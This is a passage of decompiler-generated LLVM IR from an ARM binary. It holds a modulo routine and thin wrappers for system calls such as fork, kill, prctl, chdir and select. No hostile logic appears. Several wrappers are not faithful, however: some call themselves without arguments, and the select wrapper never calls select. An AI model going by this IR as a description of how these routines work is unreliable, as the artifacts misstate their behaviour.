  uselistorder i32 %v0_a608.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_a5d4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_a660, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_a61c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a608thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_a6c4 = udiv i32 %arg1, %arg2
  ret i32 %v2_a6c4
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_a6d8 = add i32 %arg2, -1
  %v2_a6d8 = icmp eq i32 %arg2, 0
  br i1 %v2_a6d8, label %dec_label_pc_a794, label %dec_label_pc_a6e0

dec_label_pc_a6e0:                                ; preds = %entry
  %v7_a6d8 = icmp eq i32 %arg2, 1
  br i1 %v7_a6d8, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_a6e0
  %v1_a6e0 = load i32, i32* @r0, align 4
  %v10_a6e0 = icmp eq i32 %v1_a6e0, %arg2
  br i1 %v10_a6e0, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_a6e0, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_a6e0 = icmp ult i32 %v1_a6e0, %arg2
  br i1 %v4_a6e0, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_a6e8 = and i32 %v1_a6d8, %arg2
  %v8_a6e8 = icmp eq i32 %v6_a6e8, 0
  br i1 %v8_a6e8, label %.thread67, label %dec_label_pc_a6f8.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_a6ec = phi i32 [ %v1_a6e0, %bb75 ], [ 0, %.thread65 ]
  %v3_a6ec = and i32 %v1_a6ec, %v1_a6d8
  br label %bb76

dec_label_pc_a6f8.preheader:                      ; preds = %bb75
  %v2_a6f899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_a6f899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_a788, %bb74, %bb89, %bb84, %dec_label_pc_a758, %.thread67
  %v5_a6f0 = phi i32 [ %v1_a6e0, %bb74 ], [ %v3_a6ec, %.thread67 ], [ %v1_a734.v6_a734.v6_a73c.v6_a744, %dec_label_pc_a758 ], [ 0, %bb84 ], [ %v1_a78c, %dec_label_pc_a788 ], [ %v2_a788, %bb89 ]
  ret i32 %v5_a6f0

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_a6f8.preheader
  %v0_a70c.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_a6f8.preheader ], [ %v4_a700, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_a6f8.preheader ], [ %v2_a70411, %.thread1.thread9 ]
  br label %dec_label_pc_a70cthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_a6f8.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_a70411, %.thread1.thread9 ], [ 0, %dec_label_pc_a6f8.preheader ]
  %v0_a70c.pr33100 = phi i32 [ %v4_a700, %.thread1.thread9 ], [ %arg2, %dec_label_pc_a6f8.preheader ]
  %v4_a6fc = icmp ult i32 %v0_a70c.pr33100, %v1_a6e0
  br i1 %v4_a6fc, label %bb78, label %dec_label_pc_a70cthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_a700 = and i32 %v0_a70c.pr33100, 268435456
  %v3_a700 = icmp eq i32 %v2_a700, 0
  %v4_a700 = mul i32 %v0_a70c.pr33100, 16
  br i1 %v3_a700, label %.thread1.thread9, label %dec_label_pc_a70c.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_a70411 = add i32 %storemerge101, 4
  %v2_a6f8 = icmp ugt i32 %v4_a700, 268435455
  br i1 %v2_a6f8, label %.thread, label %bb77

dec_label_pc_a70cthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_a70cthread-pre-split.loopexit

dec_label_pc_a70cthread-pre-split.loopexit:       ; preds = %dec_label_pc_a70cthread-pre-split.loopexit.loopexit, %.thread
  %v0_a70c.pr3398 = phi i32 [ %v0_a70c.pr33.lcssa, %.thread ], [ %v0_a70c.pr33100, %dec_label_pc_a70cthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_a70cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_a70cthread-pre-split

dec_label_pc_a70cthread-pre-split:                ; preds = %.thread4, %dec_label_pc_a70cthread-pre-split.loopexit
  %v1_a71839 = phi i32 [ %storemerge95, %dec_label_pc_a70cthread-pre-split.loopexit ], [ %v2_a718, %.thread4 ]
  %v0_a70c.pr = phi i32 [ %v0_a70c.pr3398, %dec_label_pc_a70cthread-pre-split.loopexit ], [ %v3_a714, %.thread4 ]
  br label %dec_label_pc_a70c

dec_label_pc_a70c.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a70c.loopexit, %dec_label_pc_a70cthread-pre-split
  %v0_a720.pr = phi i32 [ %v1_a71839, %dec_label_pc_a70cthread-pre-split ], [ %storemerge101, %dec_label_pc_a70c.loopexit ]
  %v1_a714 = phi i32 [ %v0_a70c.pr, %dec_label_pc_a70cthread-pre-split ], [ %v4_a700, %dec_label_pc_a70c.loopexit ]
  %v2_a70c = icmp slt i32 %v1_a714, 0
  br i1 %v2_a70c, label %dec_label_pc_a720, label %bb79

bb79:                                             ; preds = %dec_label_pc_a70c
  %v4_a710 = icmp ult i32 %v1_a714, %v1_a6e0
  br i1 %v4_a710, label %.thread4, label %dec_label_pc_a720

.thread4:                                         ; preds = %bb79
  %v3_a714 = mul i32 %v1_a714, 2
  %v2_a718 = add i32 %v0_a720.pr, 1
  br label %dec_label_pc_a70cthread-pre-split

dec_label_pc_a720:                                ; preds = %bb79, %dec_label_pc_a70c
  %v2_a720 = add i32 %v0_a720.pr, -3
  %v5_a724 = icmp slt i32 %v0_a720.pr, 3
  br i1 %v5_a724, label %dec_label_pc_a764, label %dec_label_pc_a728

dec_label_pc_a728:                                ; preds = %dec_label_pc_a720, %bb83
  %v6_a750 = phi i32 [ %v0_a758, %bb83 ], [ %v2_a720, %dec_label_pc_a720 ]
  %v1_a72c = phi i32 [ %v1_a734.v6_a734.v6_a73c.v6_a744, %bb83 ], [ %v1_a6e0, %dec_label_pc_a720 ]
  %v3_a74c12 = phi i32 [ %v3_a74c, %bb83 ], [ %v1_a714, %dec_label_pc_a720 ]
  %v3_a728 = icmp ult i32 %v1_a72c, %v3_a74c12
  %v3_a72c = select i1 %v3_a728, i32 0, i32 %v3_a74c12
  %v1_a734 = sub i32 %v1_a72c, %v3_a72c
  %v4_a730 = udiv i32 %v3_a74c12, 2
  %v6_a730 = icmp ult i32 %v1_a734, %v4_a730
  %v6_a734 = select i1 %v6_a730, i32 0, i32 %v4_a730
  %v1_a734.v6_a734 = sub i32 %v1_a734, %v6_a734
  %.demorgan = and i1 %v3_a728, %v6_a730
  %v4_a738 = udiv i32 %v3_a74c12, 4
  %v6_a738 = icmp ult i32 %v1_a734.v6_a734, %v4_a738
  %v6_a73c = select i1 %v6_a738, i32 0, i32 %v4_a738
  %v1_a734.v6_a734.v6_a73c = sub i32 %v1_a734.v6_a734, %v6_a73c
  %.demorgan71 = and i1 %.demorgan, %v6_a738
  %v4_a740 = udiv i32 %v3_a74c12, 8
  %v6_a740 = icmp ult i32 %v1_a734.v6_a734.v6_a73c, %v4_a740
  %v6_a744 = select i1 %v6_a740, i32 0, i32 %v4_a740
  %v1_a734.v6_a734.v6_a73c.v6_a744 = sub i32 %v1_a734.v6_a734.v6_a73c, %v6_a744
  %.demorgan72 = and i1 %.demorgan71, %v6_a740
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_a728
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_a728, %bb80
  %v2_a748 = add i32 %v1_a734.v6_a734.v6_a73c.v6_a744, -1
  %v4_a748 = sub i32 0, %v1_a734.v6_a734.v6_a73c.v6_a744
  %v5_a748 = and i32 %v1_a734.v6_a734.v6_a73c.v6_a744, %v4_a748
  %v3_a74c = udiv i32 %v3_a74c12, 16
  %v5_a750 = icmp slt i32 %v1_a734.v6_a734.v6_a73c.v6_a744, 1
  br i1 %v5_a750, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_a750 = add i32 %v6_a750, -4
  %v9_a750 = sub i32 3, %v6_a750
  %v10_a750 = and i32 %v9_a750, %v6_a750
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_a758 = phi i32 [ %v6_a750, %bb81 ], [ %v7_a750, %bb82 ]
  %v0_a75415.in = phi i32 [ %v2_a748, %bb81 ], [ %v7_a750, %bb82 ]
  %v1_a75414.in = phi i32 [ %v5_a748, %bb81 ], [ %v10_a750, %bb82 ]
  %v1_a75414 = icmp slt i32 %v1_a75414.in, 0
  %v0_a75415 = icmp slt i32 %v0_a75415.in, 0
  %v2_a754 = xor i1 %v0_a75415, %v1_a75414
  br i1 %v2_a754, label %dec_label_pc_a758, label %dec_label_pc_a728

dec_label_pc_a758:                                ; preds = %bb83
  %v1_a758 = urem i32 %v0_a758, 4
  %v2_a758 = icmp eq i32 %v1_a758, 0
  br i1 %v2_a758, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_a758
  %v3_a75c = icmp eq i32 %v1_a734.v6_a734.v6_a73c.v6_a744, 0
  br i1 %v3_a75c, label %bb76, label %dec_label_pc_a764

dec_label_pc_a764:                                ; preds = %bb84, %dec_label_pc_a720
  %v0_a778 = phi i32 [ %v3_a74c, %bb84 ], [ %v1_a714, %dec_label_pc_a720 ]
  %v1_a774 = phi i32 [ %v1_a734.v6_a734.v6_a73c.v6_a744, %bb84 ], [ %v1_a6e0, %dec_label_pc_a720 ]
  %v0_a764 = phi i32 [ %v0_a758, %bb84 ], [ %v2_a720, %dec_label_pc_a720 ]
  %v5_a768 = icmp slt i32 %v0_a764, -2
  br i1 %v5_a768, label %dec_label_pc_a788, label %dec_label_pc_a76c

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a764
  %v8_a764 = icmp eq i32 %v0_a764, -2
  br i1 %v8_a764, label %dec_label_pc_a77c, label %dec_label_pc_a770

dec_label_pc_a770:                                ; preds = %dec_label_pc_a76c
  %v3_a770 = icmp ult i32 %v1_a774, %v0_a778
  br i1 %v3_a770, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_a770
  %v2_a770 = sub i32 %v1_a774, %v0_a778
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_a770, %bb85
  %v0_a77c52 = phi i32 [ %v1_a774, %dec_label_pc_a770 ], [ %v2_a770, %bb85 ]
  %v3_a778 = udiv i32 %v0_a778, 2
  br label %dec_label_pc_a77c

dec_label_pc_a77c:                                ; preds = %dec_label_pc_a76c, %bb86
  %v0_a784 = phi i32 [ %v0_a778, %dec_label_pc_a76c ], [ %v3_a778, %bb86 ]
  %v1_a780 = phi i32 [ %v1_a774, %dec_label_pc_a76c ], [ %v0_a77c52, %bb86 ]
  %v3_a77c = icmp ult i32 %v1_a780, %v0_a784
  br i1 %v3_a77c, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_a77c
  %v2_a77c = sub i32 %v1_a780, %v0_a784
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_a77c, %bb87
  %v0_a78855 = phi i32 [ %v1_a780, %dec_label_pc_a77c ], [ %v2_a77c, %bb87 ]
  %v3_a784 = udiv i32 %v0_a784, 2
  br label %dec_label_pc_a788

dec_label_pc_a788:                                ; preds = %dec_label_pc_a764, %bb88
  %v2_a78c = phi i32 [ %v0_a778, %dec_label_pc_a764 ], [ %v3_a784, %bb88 ]
  %v1_a78c = phi i32 [ %v1_a774, %dec_label_pc_a764 ], [ %v0_a78855, %bb88 ]
  %v3_a788 = icmp ult i32 %v1_a78c, %v2_a78c
  br i1 %v3_a788, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_a788
  %v2_a788 = sub i32 %v1_a78c, %v2_a78c
  br label %bb76

dec_label_pc_a794:                                ; preds = %entry
  %v0_a794 = load i32, i32* @lr, align 4
  %v0_a798 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_a794)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_a78c, { 1, 2, 0 }
  uselistorder i32 %v0_a778, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_a758, { 1, 0, 2 }
  uselistorder i32 %v7_a750, { 1, 0 }
  uselistorder i32 %v3_a74c, { 1, 0 }
  uselistorder i32 %v1_a734.v6_a734.v6_a73c.v6_a744, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_a740, { 1, 0 }
  uselistorder i32 %v4_a738, { 1, 0 }
  uselistorder i32 %v4_a730, { 1, 0 }
  uselistorder i32 %v6_a750, { 3, 0, 2, 1 }
  uselistorder i32 %v2_a720, { 1, 0 }
  uselistorder i32 %v1_a714, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_a700, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a70c.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a6e0, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_a788, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_a77c, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_a728, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_a7a4 = load i32, i32* @r0, align 4
  ret i32 %v1_a7a4
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_a7a8 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @ip, align 4
  %v1_a7b8 = add i32 %arg2, -12
  store i32 %v6_a7a8, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_a7b8, 2
  br i1 %tmp, label %dec_label_pc_a7e0, label %dec_label_pc_a7d8

dec_label_pc_a7d8:                                ; preds = %entry
  %v0_a7d8 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_a80c

dec_label_pc_a7e0:                                ; preds = %entry
  %v2_a7e8 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_a7e8, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_a7e8, -4095
  br i1 %tmp8, label %dec_label_pc_a80c, label %dec_label_pc_a7f8

dec_label_pc_a7f8:                                ; preds = %dec_label_pc_a7e0
  %v0_a7f8 = call i32 @__errno_location()
  %v0_a7fc = load i32, i32* %r4.global-to-local, align 4
  %v1_a7fc = sub i32 0, %v0_a7fc
  %v2_a800 = inttoptr i32 %v0_a7f8 to i32*
  store i32 %v1_a7fc, i32* %v2_a800, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a80c

dec_label_pc_a80c:                                ; preds = %dec_label_pc_a7f8, %dec_label_pc_a7e0, %dec_label_pc_a7d8
  %storemerge = phi i32 [ %v0_a7d8, %dec_label_pc_a7d8 ], [ %v2_a7e8, %dec_label_pc_a7e0 ], [ -1, %dec_label_pc_a7f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_a7e8, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_a83c = load i32, i32* @r0, align 4
  store i32 %v0_a83c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a83c, -4095
  br i1 %tmp, label %dec_label_pc_a858, label %dec_label_pc_a848

dec_label_pc_a848:                                ; preds = %entry
  %v0_a848 = call i32 @__errno_location()
  %v0_a84c = load i32, i32* %r4.global-to-local, align 4
  %v1_a84c = sub i32 0, %v0_a84c
  %v2_a850 = inttoptr i32 %v0_a848 to i32*
  store i32 %v1_a84c, i32* %v2_a850, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a858

dec_label_pc_a858:                                ; preds = %entry, %dec_label_pc_a848
  %v0_a858 = phi i32 [ %v0_a83c, %entry ], [ -1, %dec_label_pc_a848 ]
  ret i32 %v0_a858

; uselistorder directives
  uselistorder i32 %v0_a83c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a858, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a894 = load i32, i32* @r4, align 4
  store i32 %v3_a894, i32* %stack_var_-8, align 4
  %v0_a898 = call i32 @chdir()
  store i32 %v0_a898, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a898, -4095
  br i1 %tmp, label %dec_label_pc_a8b8, label %dec_label_pc_a8a8

dec_label_pc_a8a8:                                ; preds = %entry
  %v0_a8a8 = call i32 @__errno_location()
  %v0_a8ac = load i32, i32* %r4.global-to-local, align 4
  %v1_a8ac = sub i32 0, %v0_a8ac
  %v2_a8b0 = inttoptr i32 %v0_a8a8 to i32*
  store i32 %v1_a8ac, i32* %v2_a8b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a8b8

dec_label_pc_a8b8:                                ; preds = %entry, %dec_label_pc_a8a8
  %v0_a8b8 = phi i32 [ %v0_a898, %entry ], [ -1, %dec_label_pc_a8a8 ]
  %v2_a8bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_a8bc, i32* @r4, align 4
  ret i32 %v0_a8b8

; uselistorder directives
  uselistorder i32 %v0_a898, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_a8b8, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a8c0 = load i32, i32* @r4, align 4
  store i32 %v3_a8c0, i32* %stack_var_-8, align 4
  %v1_a8c4 = call i32 @close(i32 %arg1)
  store i32 %v1_a8c4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_a8c4, -4095
  br i1 %tmp, label %dec_label_pc_a8e4, label %dec_label_pc_a8d4

dec_label_pc_a8d4:                                ; preds = %entry
  %v0_a8d4 = call i32 @__errno_location()
  %v0_a8d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_a8d8 = sub i32 0, %v0_a8d8
  %v2_a8dc = inttoptr i32 %v0_a8d4 to i32*
  store i32 %v1_a8d8, i32* %v2_a8dc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a8e4

dec_label_pc_a8e4:                                ; preds = %entry, %dec_label_pc_a8d4
  %v0_a8e4 = phi i32 [ %v1_a8c4, %entry ], [ -1, %dec_label_pc_a8d4 ]
  %v2_a8e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_a8e8, i32* @r4, align 4
  ret i32 %v0_a8e4

; uselistorder directives
  uselistorder i32 %v1_a8c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a8e4, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a8ec = load i32, i32* @r4, align 4
  store i32 %v3_a8ec, i32* %stack_var_-8, align 4
  %v0_a8f0 = call i32 @fork()
  store i32 %v0_a8f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a8f0, -4095
  br i1 %tmp, label %dec_label_pc_a910, label %dec_label_pc_a900

dec_label_pc_a900:                                ; preds = %entry
  %v0_a900 = call i32 @__errno_location()
  %v0_a904 = load i32, i32* %r4.global-to-local, align 4
  %v1_a904 = sub i32 0, %v0_a904
  %v2_a908 = inttoptr i32 %v0_a900 to i32*
  store i32 %v1_a904, i32* %v2_a908, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a910

dec_label_pc_a910:                                ; preds = %entry, %dec_label_pc_a900
  %v0_a910 = phi i32 [ %v0_a8f0, %entry ], [ -1, %dec_label_pc_a900 ]
  %v2_a914 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_a914, i32* @r4, align 4
  ret i32 %v0_a910

; uselistorder directives
  uselistorder i32 %v0_a8f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a910, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a918 = load i32, i32* @r4, align 4
  store i32 %v3_a918, i32* %stack_var_-8, align 4
  %v0_a91c = call i32 @getpid()
  store i32 %v0_a91c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a91c, -4095
  br i1 %tmp, label %dec_label_pc_a93c, label %dec_label_pc_a92c

dec_label_pc_a92c:                                ; preds = %entry
  %v0_a92c = call i32 @__errno_location()
  %v0_a930 = load i32, i32* %r4.global-to-local, align 4
  %v1_a930 = sub i32 0, %v0_a930
  %v2_a934 = inttoptr i32 %v0_a92c to i32*
  store i32 %v1_a930, i32* %v2_a934, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a93c

dec_label_pc_a93c:                                ; preds = %entry, %dec_label_pc_a92c
  %v0_a93c = phi i32 [ %v0_a91c, %entry ], [ -1, %dec_label_pc_a92c ]
  %v2_a940 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_a940, i32* @r4, align 4
  ret i32 %v0_a93c

; uselistorder directives
  uselistorder i32 %v0_a91c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a93c, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a944 = load i32, i32* @r4, align 4
  store i32 %v3_a944, i32* %stack_var_-8, align 4
  %v0_a948 = call i32 @getppid()
  store i32 %v0_a948, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a948, -4095
  br i1 %tmp, label %dec_label_pc_a968, label %dec_label_pc_a958

dec_label_pc_a958:                                ; preds = %entry
  %v0_a958 = call i32 @__errno_location()
  %v0_a95c = load i32, i32* %r4.global-to-local, align 4
  %v1_a95c = sub i32 0, %v0_a95c
  %v2_a960 = inttoptr i32 %v0_a958 to i32*
  store i32 %v1_a95c, i32* %v2_a960, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a968

dec_label_pc_a968:                                ; preds = %entry, %dec_label_pc_a958
  %v0_a968 = phi i32 [ %v0_a948, %entry ], [ -1, %dec_label_pc_a958 ]
  %v2_a96c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_a96c, i32* @r4, align 4
  ret i32 %v0_a968

; uselistorder directives
  uselistorder i32 %v0_a948, { 1, 0, 2 }
  uselistorder i32 ()* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_a968, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a970 = load i32, i32* @r4, align 4
  store i32 %v3_a970, i32* %stack_var_-8, align 4
  %v0_a974 = call i32 @kill()
  store i32 %v0_a974, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a974, -4095
  br i1 %tmp, label %dec_label_pc_a994, label %dec_label_pc_a984

dec_label_pc_a984:                                ; preds = %entry
  %v0_a984 = call i32 @__errno_location()
  %v0_a988 = load i32, i32* %r4.global-to-local, align 4
  %v1_a988 = sub i32 0, %v0_a988
  %v2_a98c = inttoptr i32 %v0_a984 to i32*
  store i32 %v1_a988, i32* %v2_a98c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a994

dec_label_pc_a994:                                ; preds = %entry, %dec_label_pc_a984
  %v0_a994 = phi i32 [ %v0_a974, %entry ], [ -1, %dec_label_pc_a984 ]
  %v2_a998 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_a998, i32* @r4, align 4
  ret i32 %v0_a994

; uselistorder directives
  uselistorder i32 %v0_a974, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a994, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a99c = load i32, i32* @r4, align 4
  store i32 %v3_a99c, i32* %stack_var_-8, align 4
  %v0_a9a4 = call i32 @prctl()
  store i32 %v0_a9a4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_a9a4, -4095
  br i1 %tmp, label %dec_label_pc_a9c4, label %dec_label_pc_a9b4

dec_label_pc_a9b4:                                ; preds = %entry
  %v0_a9b4 = call i32 @__errno_location()
  %v0_a9b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_a9b8 = sub i32 0, %v0_a9b8
  %v2_a9bc = inttoptr i32 %v0_a9b4 to i32*
  store i32 %v1_a9b8, i32* %v2_a9bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a9c4

dec_label_pc_a9c4:                                ; preds = %entry, %dec_label_pc_a9b4
  %v0_a9c4 = phi i32 [ %v0_a9a4, %entry ], [ -1, %dec_label_pc_a9b4 ]
  %v2_a9c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_a9c8, i32* @r4, align 4
  ret i32 %v0_a9c4

; uselistorder directives
  uselistorder i32 %v0_a9a4, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_a9c4, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a9cc = load i32, i32* @r4, align 4
  store i32 %v3_a9cc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_a9f4, label %dec_label_pc_a9e4

dec_label_pc_a9e4:                                ; preds = %entry
  %v0_a9e4 = call i32 @__errno_location()
  %v0_a9e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_a9e8 = sub i32 0, %v0_a9e8
  %v2_a9ec = inttoptr i32 %v0_a9e4 to i32*
  store i32 %v1_a9e8, i32* %v2_a9ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_a9f8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %entry, %dec_label_pc_a9e4
  %v2_a9f8 = phi i32 [ %v3_a9cc, %entry ], [ %v2_a9f8.pre, %dec_label_pc_a9e4 ]
  %v0_a9f4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_a9e4 ]
  store i32 %v2_a9f8, i32* @r4, align 4
  ret i32 %v0_a9f4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a9f4, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a9fc = load i32, i32* @r4, align 4
  store i32 %v3_a9fc, i32* %stack_var_-8, align 4
  %v2_aa00 = call i32 @time(i32* %arg1)
  store i32 %v2_aa00, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_aa00, -4095
  br i1 %tmp, label %dec_label_pc_aa20, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %entry
  %v0_aa10 = call i32 @__errno_location()
  %v0_aa14 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa14 = sub i32 0, %v0_aa14
  %v2_aa18 = inttoptr i32 %v0_aa10 to i32*
  store i32 %v1_aa14, i32* %v2_aa18, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa20

dec_label_pc_aa20:                                ; preds = %entry, %dec_label_pc_aa10
